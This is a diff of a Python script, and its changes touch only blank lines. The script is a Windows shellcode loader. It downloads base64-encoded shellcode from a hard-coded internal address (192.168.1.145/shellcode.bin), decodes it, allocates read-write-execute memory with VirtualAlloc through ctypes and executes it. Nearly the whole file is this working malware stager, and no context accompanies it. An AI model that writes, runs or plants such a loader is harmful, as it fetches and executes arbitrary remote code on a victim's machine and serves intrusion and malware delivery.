@@ -3,20 +3,17 @@ from urllib import request
 import base64
 import ctypes
 
-
 kernel32 = ctypes.windll.kernel32
 
 
 def get_code(url):
     with request.urlopen(url) as response:
         shellcode = base64.decodebytes(response.read())
-
     return shellcode
 
 
 def write_memory(buf):
     length = len(buf)
-
     try:
         kernel32.VirtualAlloc.restype = ctypes.c_void_p
         ptr = kernel32.VirtualAlloc(None, length, 0x3000, 0x40)
@@ -34,8 +31,6 @@ def write_memory(buf):
         print(f'Error: {e}')
 
 
-
-
 def run(shellcode):
     buf = ctypes.create_string_buffer(shellcode)
     ptr = write_memory(buf)
@@ -44,7 +39,6 @@ def run(shellcode):
 
 
 if __name__ == '__main__':
-    
     url = 'http://192.168.1.145/shellcode.bin'
     shellcode = get_code(url)
     run(shellcode)
